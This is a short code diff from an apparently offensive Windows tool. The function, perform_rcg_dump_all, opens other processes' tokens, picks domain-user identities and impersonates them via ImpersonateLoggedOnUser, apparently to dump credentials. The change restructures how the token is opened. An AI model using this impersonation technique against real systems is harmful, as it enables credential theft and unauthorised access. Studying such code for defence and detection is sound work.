@@ -464,26 +464,26 @@ BOOL perform_rcg_dump_all(DG_ARGUMENTS* args)
 
 				if (hProcess != NULL)
 				{
-					HANDLE hProcessToken = NULL;
+					HANDLE hProcessTokenQuery = NULL;
 					
-					if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hProcessToken))
+					if (OpenProcessToken(hProcess, TOKEN_QUERY, &hProcessTokenQuery))
 					{
 						BYTE token_data[256];
 						memset(token_data, 0, sizeof(token_data));
 
 						DWORD token_length = 0;
 
-						if (GetTokenInformation(hProcessToken, TokenUser, token_data, sizeof(token_data), &token_length))
+						if (GetTokenInformation(hProcessTokenQuery, TokenUser, token_data, sizeof(token_data), &token_length))
 						{
 							TOKEN_USER* token_user = (TOKEN_USER*)token_data;
 
 							if (is_domain_sid(token_user->User.Sid) && !is_existing_sid(token_user->User.Sid, existing_sids, existing_sid_count))
 							{
-								HANDLE hDuplicatedToken = NULL;
+								HANDLE hProcessTokenDuplicate = NULL;
 
-								if (DuplicateToken(hProcessToken, SecurityImpersonation, &hDuplicatedToken))
+								if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hProcessTokenDuplicate))
 								{
-									if (ImpersonateLoggedOnUser(hDuplicatedToken))
+									if (ImpersonateLoggedOnUser(hProcessTokenDuplicate))
 									{
 										LPWSTR sid_string = NULL;
 
@@ -504,12 +504,12 @@ BOOL perform_rcg_dump_all(DG_ARGUMENTS* args)
 										RevertToSelf();
 									}
 
-									CloseHandle(hDuplicatedToken);
+									CloseHandle(hProcessTokenDuplicate);
 								}
 							}
 						}
 
-						CloseHandle(hProcessToken);
+						CloseHandle(hProcessTokenQuery);
 					}
 
 					CloseHandle(hProcess);
